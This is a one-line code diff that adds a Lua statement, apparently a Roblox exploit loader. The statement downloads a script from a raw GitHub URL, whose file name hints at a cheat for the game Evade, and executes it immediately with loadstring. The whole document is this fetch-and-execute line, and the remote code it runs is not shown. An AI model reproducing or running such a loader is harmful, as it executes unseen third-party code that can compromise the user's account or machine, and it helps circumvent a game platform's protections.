@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/1-5x-hlwn-evade-spam4-0lm21rtmmbhs8f.lua"))()
